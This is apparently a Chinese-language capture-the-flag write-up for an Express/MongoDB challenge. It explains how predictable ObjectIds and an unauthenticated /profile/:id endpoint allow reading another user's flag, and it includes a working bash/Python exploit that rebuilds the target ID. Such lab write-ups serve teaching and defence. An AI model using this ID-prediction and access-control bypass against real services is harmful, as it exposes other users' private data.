## 题解

### 入口与指纹

Express 应用，`/register`、`/login`、`/profile/:id`、`/info`、`/starttime`。
注册返回：

```json
{"userId":"6ae0e55d9a846c49cb0d23c2","userNumber":3,
 "maybehint":"You are 3 from your target user","distance":3}
```

`/starttime` 给出应用启动时间戳（也是「第一个用户注册时间」）：
`1793123663` → `0x6ae0e54f`。

### 关键观察

**1. `userId` 是标准 Mongo ObjectId：`4 字节时间戳 + 5 字节随机 + 3 字节计数器`。**

我们的 id 拆开是：

```text
6ae0e55d  9a846c49cb  0d23c2
时间戳     随机          计数器
```

`0x6ae0e55d = 1793123677`，比启动时间晚 14 秒；随机段 `9a846c49cb` 是**进程级**的；
计数器 `0x0d23c2` 在整个进程里递增（每建一个文档 +1）。

**2. `distance` 就是「你与目标用户的计数器差值」。**

我们 `userNumber=3`、`distance=3`，目标就是 `user0`：
把计数器减去 3 得到 `0x0d23bf`，时间戳换成启动时间 `0x6ae0e54f`。

**3. `/profile/:id` 不需要登录，也不校验归属。**

```bash
curl http://$T/profile/6ae0e54f9a846c49cb0d23bf
# Welcome, user0 ... <p>flag{...}</p>
```

### 利用链

```bash
T=$(head -1 .target)
START=$(curl -s $T/starttime)                                  # 1793123663
# 1. 注册一个账号拿到随机段与计数器
R=$(curl -s -X POST -d 'username=aa&password=pw123456' $T/register)
OID=$(echo "$R" | python3 -c 'import json,sys;print(json.load(sys.stdin)["userId"])')
D=$(echo "$R" | python3 -c 'import json,sys;print(json.load(sys.stdin)["distance"])')
# 2. 换成启动时间戳 + 同一随机段 + (计数器 - distance)
python3 - "$START" "$OID" "$D" "$T" <<'PY'
import sys,urllib.request
start,oid,dist,T=int(sys.argv[1]),sys.argv[2],int(sys.argv[3]),sys.argv[4]
ts=f"{start:08x}"; rand=oid[8:18]; ctr=int(oid[18:],16)
for delta in range(-2, 4):
    cand=f"{ts}{rand}{ctr-dist+delta:06x}"
    try: body=urllib.request.urlopen(f"{T}/profile/{cand}",timeout=5).read().decode()
    except Exception: continue
    if "flag{" in body: print(cand, body.split("flag{")[1].split("}")[0]); break
PY
```

### flag 位置

`user0`（第一个注册用户）的 `/profile/<ObjectId>` 页面。

## 复盘

- **Mongo ObjectId 可以离线拆解。** 时间戳是明文秒数，计数器是进程内递增；只要知道
  「目标比我早/晚几个」，就能反推出完整 id，不需要枚举。
- **`distance` 字段是直接的作弊器**：它告诉你要倒退几步。
- `/profile/:id` 既不需要登录也不校验归属，所以拿到 id 就等于拿到数据。
- 时间戳要用 `/starttime`，不要用自己注册时的（两者差十几秒，会全部 miss）。
